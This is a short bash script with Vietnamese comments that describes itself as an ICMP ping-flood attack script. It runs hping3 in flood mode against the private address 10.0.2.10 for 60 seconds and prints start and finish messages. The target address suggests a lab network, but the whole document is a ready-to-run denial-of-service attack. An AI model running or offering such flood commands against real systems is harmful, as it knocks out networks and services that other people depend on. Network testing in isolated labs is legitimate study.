
#!/bin/bash
# Kich ban tan cong ICMP (Ping) Flood
VICTIM=10.0.2.10
DURATION=60

echo "Bat dau ICMP Flood vao $VICTIM trong $DURATION giay..."
timeout $DURATION hping3 -1 --flood $VICTIM
echo "Hoan tat tan cong ICMP Flood!"

